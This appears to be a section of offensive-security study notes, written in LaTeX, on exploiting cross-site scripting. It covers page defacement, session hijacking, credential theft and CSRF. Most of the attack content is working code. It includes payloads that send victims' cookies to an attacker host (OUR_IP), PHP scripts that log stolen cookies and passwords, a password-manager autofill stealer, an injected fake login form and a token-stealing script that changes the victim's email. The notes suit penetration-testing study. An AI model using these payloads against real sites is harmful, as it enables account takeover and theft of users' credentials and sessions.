\section{Exploiting XSS}

\subsection{Defacing attack}
One of the most common attacks usually used with stored XSS vulnerabilities is
website defacing attacks. 

Although many other vulnerabilities may be utilized to achieve the same thing,
stored XSS vulnerabilities are among the most used vulnerabilities for doing
so.

We can utilize injected JavaScript code (through XSS) to make a web page look
any way we like. However, defacing a website is usually used to send a simple
message (i.e., we successfully hacked you), so giving the defaced web page a
beautiful look isn't really the primary target.

Three HTML elements are usually utilized to change the main look of a web page:
\begin{itemize}
        \item Background Color \verb+document.body.style.background+
        \item Background \verb+document.body.background+
        \item Page \verb+Title document.title+
        \item Page Text \verb+DOM.innerHTML+ that should be {\bf minifyed}
\end{itemize}

We can utilize two or three of these elements to write a basic message to the
web page and even remove the vulnerable element
\verb+document.getElementById().remove()+ such that it would be more difficult
to quickly reset the web page, as we will see next.

To find the id of the HTML element to remove, one can use the {\emph Page
Inspector Picker}

Another solution more violant is to comment all the HTML after the payload 


\subsection{Session hijacking}
Stealing cookies is a traditional way to exploit XSS. Most web applications use
cookies for session handling. You can exploit cross-site scripting
vulnerabilities to send the victim's cookies to your own domain, then manually
inject the cookies into the browser and impersonate the victim.

In practice, this approach has some significant limitations:
\begin{itemize}
   \item  The victim might not be logged in.
   \item  Many applications hide their cookies from JavaScript using the
       \verb+HttpOnly+ flag.
   \item  Sessions might be locked to additional factors like the user's IP
       address.
   \item  The session might time out before you're able to hijack it.
\end{itemize}

There are multiple JavaScript payloads we can use to grab the session cookie
and send it to us, as shown by
\href{https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#exploit-code-or-poc}{PayloadsAllTheThings}:
\begin{verbatim}
document.location='http://OUR_IP/index.php?c='+document.cookie;
new Image().src='http://OUR_IP/index.php?c='+document.cookie;
\end{verbatim}


runing on our webserver
\begin{verbatim}
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | $key : {$cookie}\n");
        fclose($file);
    }
}
?>
\end{verbatim}


\subsection{Stealing credentials}

\subsubsection{Exploiting password managers}
 These days, many users have password managers that auto-fill their passwords.
 You can take advantage of this by creating a password input, reading out the
 auto-filled password, and sending it to your own domain. This technique avoids
 most of the problems associated with stealing cookies, and can even gain
 access to every other account where the victim has reused the same password.

The primary disadvantage of this technique is that it only works on users who
have a password manager that performs password auto-fill. (Of course, if a user
doesn't have a password saved you can still attempt to obtain their password
through an on-site phishing attack, but it's not quite the same.) 

\begin{verbatim}
<input name=username id=username>
<input type=password name=password onchange="if(this.value.length)fetch('URL',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});">
\end{verbatim}

\subsubsection{On-site phishing attack}
A common form of XSS phishing attacks is through injecting fake login forms
that send the login details to the attacker's server, which may then be used to
log in on behalf of the victim and gain control over their account and
sensitive information.

One common vector can be a form of image viewers (type an image url to be
displayed).

The attack will consist of creating a payload that will deface the webpage and
insert a login form. The form action will send the data to a webserver owned by
the attacker.

example of payload:
\begin{verbatim}
<script>document.write('
    <h3>Please login to continue</h3>
    <form action=http://OUR_IP/index.php>
        <input type="username" name="username" placeholder="Username">
        <input type="password" name="password" placeholder="Password">
        <input type="submit" name="submit" value="Login">
    </form>');
    document.getElementById('urlform').remove();
\end{verbatim}

For the attacker server a simple nc will work but for persistance a php server
with the following code can be started:
\begin{verbatim}
<?php
if (isset($_GET['username']) && isset($_GET['password'])) {
    $file = fopen("creds.txt", "a+");
    fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n");
    header("Location: http://SERVER_IP/phishing/index.php");
    fclose($file);
    exit();
}
?>
\end{verbatim}


\subsection{Performing CSRF}
Anything a legitimate user can do on a web site, you can probably do too with
XSS. Depending on the site you're targeting, you might be able to make a victim
send a message, accept a friend request, commit a backdoor to a source code
repository, or transfer some Bitcoin.

Some websites allow logged-in users to change their email address without
re-entering their password. If you've found an XSS vulnerability, you can make
it trigger this functionality to change the victim's email address to one that
you control, and then trigger a password reset to gain access to the account.

This type of exploit is typically referred to as cross-site request forgery
(CSRF), which is slightly confusing because CSRF can also occur as a standalone
vulnerability. When CSRF occurs as a standalone vulnerability, it can be
patched using strategies like anti-CSRF tokens. However, these strategies do
not provide any protection if an XSS vulnerability is also present. 
\begin{verbatim}
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/my-account',true);
req.send();
function handleResponse() {
    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/my-account/change-email', true);
    changeReq.send('csrf='+token+'&email=test@test.com')
};
</script>
\end{verbatim}
